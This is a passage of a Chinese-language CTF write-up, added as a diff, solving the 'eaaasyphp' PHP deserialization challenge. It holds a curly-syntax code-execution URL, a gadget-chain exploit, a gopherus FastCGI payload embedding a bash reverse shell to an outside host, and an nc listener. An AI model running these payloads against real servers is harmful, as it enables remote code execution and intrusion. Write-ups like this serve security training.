@@ -323,4 +323,156 @@ https://www.bbsmax.com/A/6pdDvoERJw/
 ”PHP的curly systax能导致代码执行，它将执行花括号间的代码，并将结果替换回去，如下例:
 <?php $var = "I was innocent until ${`ls`}" appeared here; ?>"
 
+```
 //http://106.14.120.231:22808/?whoami[admin]=d41d8cd98f00b204e9800998ecf8427e&code=9${`cat%20/f???`};${require(
+```
+
+# 2021陇原战疫
+
+## eaaasyphp
+原题改编，在 Geek Challenge 2021中有
+
+https://wp.n03tack.top/posts/14620/#eaaasyphp
+
+题目
+```php
+<?php
+
+class Check {
+    public static $str1 = false;
+    public static $str2 = false;
+}
+
+
+class Esle {
+    public function __wakeup()
+    {
+        Check::$str1 = true;
+    }
+}
+
+
+class Hint {
+
+    public function __wakeup(){
+        $this->hint = "no hint";
+    }
+
+    public function __destruct(){
+        if(!$this->hint){
+            $this->hint = "phpinfo";
+            ($this->hint)();
+        }  
+    }
+}
+
+
+class Bunny {
+
+    public function __toString()
+    {
+        if (Check::$str2) {
+            if(!$this->data){
+                $this->data = $_REQUEST['data'];
+            }
+            file_put_contents($this->filename, $this->data);
+        } else {
+            throw new Error("Error");
+        }
+    }
+}
+
+class Welcome {
+    public function __invoke()
+    {
+        Check::$str2 = true;
+        return "Welcome" . $this->username;
+    }
+}
+
+class Bypass {
+
+    public function __destruct()
+    {
+        if (Check::$str1) {
+            ($this->str4)();
+        } else {
+            throw new Error("Error");
+        }
+    }
+}
+
+if (isset($_GET['code'])) {
+    unserialize($_GET['code']);
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+
+解题过程
+
+```php
+<?php
+
+class Esle
+{
+}
+
+class Hint
+{
+    public function __construct()
+    {
+        $this->hint = "phpinfo";
+    }
+}
+
+
+class Bunny
+{
+    public function __construct()
+    {
+        $this->filename = "ftp://bbb@wgf4242.51vip.biz:36956/aaa";
+        $this->data = urldecode("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxxxx/5000%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00");
+    }
+}
+
+class Welcome
+{
+    public function __construct()
+    {
+        $this->username = new Bunny();
+    }
+}
+
+class Bypass
+{
+
+    public function __construct()
+    {
+        $this->str4 = new Welcome();
+    }
+}
+echo urlencode(serialize(array(new Esle(), new Bypass())));
+```
+
+
+首先使用 gopherus 生成payload：
+```
+gopherus --exploit fastcgi
+/var/www/html/index.php
+bash -c "bash -i >& /dev/tcp/wgf4242.51vip.biz/39672 0>&1"
+得到
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH110%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00n%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/wgf4242.51vip.biz/39672%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
+```
+
+1.$this->data的Payload只要`_`后面的内容
+
+```
+%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH110%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00n%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/wgf4242.51vip.biz/39672%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
+```
+2.ftp地址使用映射地址。
+
+本地监听 39672  对应的端口 我花生壳映射的是2333
+`nc -lvp 2333`
+
